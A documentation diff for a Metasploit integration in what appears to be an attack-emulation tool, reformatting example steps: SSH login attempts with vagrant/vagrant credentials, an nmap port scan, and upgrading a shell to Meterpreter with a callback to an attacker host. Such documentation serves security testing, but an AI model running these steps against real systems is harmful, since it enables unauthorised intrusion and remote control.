@@ -20,9 +20,9 @@ Metasploit must be accessible from Worker it will be executed on.
     Datastore options (variables) to use for the execution.  
     Basically an equivalent to `set OPTION value`.
     
-    | Name        | Type   | Required | Default value | Example value         |
-    |-------------|--------|----------|---------------|-----------------------|
-    | `datastore` | object | &cross;  |               | `{"RHOST": "target"}` |
+    | Name        | Type   | Required | Default value | Example value            |
+    |-------------|--------|----------|---------------|--------------------------|
+    | `datastore` | object | &cross;  |               | `{"RHOST": "127.0.0.1"}` |
 
 === "Custom"
 
@@ -45,12 +45,15 @@ Number of seconds to wait before the module execution will be terminated.
 ### SSH login module
 Input:
 ```yaml
-module_arguments:
-  module_name: scanner/ssh/ssh_login
-  datastore:
-    RHOSTS: CHANGE_ME
-    USERNAME: vagrant
-    PASSWORD: vagrant
+my-step:
+  module: metasploit
+  arguments:
+    module_name: scanner/ssh/ssh_login
+    datastore:
+      RHOSTS: {{ target }}
+      USERNAME: vagrant
+      PASSWORD: vagrant
+
 ```
 
 Output:
@@ -64,22 +67,38 @@ Output:
 
 ### Running Nmap
 ```yaml
-module_arguments:
-  commands:
-    - db_nmap --top-ports 100 CHANGE_ME
+my-step:
+  module: metasploit
+  arguments:
+    commands:
+      - db_nmap --top-ports 100 {{ target }}
+
 ```
 
 ### Upgrade shell session
 ```yaml
-module_arguments:
-  module_name: multi/manage/shell_to_meterpreter
-  datastore:
-    LHOST: {{ attackerHost }}
-    SESSION: 1
+my-step:
+  module: metasploit
+  arguments:
+    module_name: multi/manage/shell_to_meterpreter
+    datastore:
+      LHOST: {{ attacker_host }}
+      SESSION: 1
+
 ```
 
 ## Troubleshooting
 So far so good.
+
+!!! warning "Session types"
+
+    Metasploit Framework supports two types of sessions.
+    
+    The first is a shell session, you can run any shell commands you want.
+    
+    The second is called Meterpreter. It allows you to use it's provided commands, such as `ifconfig` or `sysinfo`. 
+    To run a command in a shell, you need to use the `execute` command with the `-f`, `-i`, and `-a` options (`execute -f <command> -i -a <arguments>`).
+    In some cases, the command execution can fail. Before creating a plan, make sure it works for your target system/exploit.
 
 ## Output serialization
 Only the session ID is serialized.
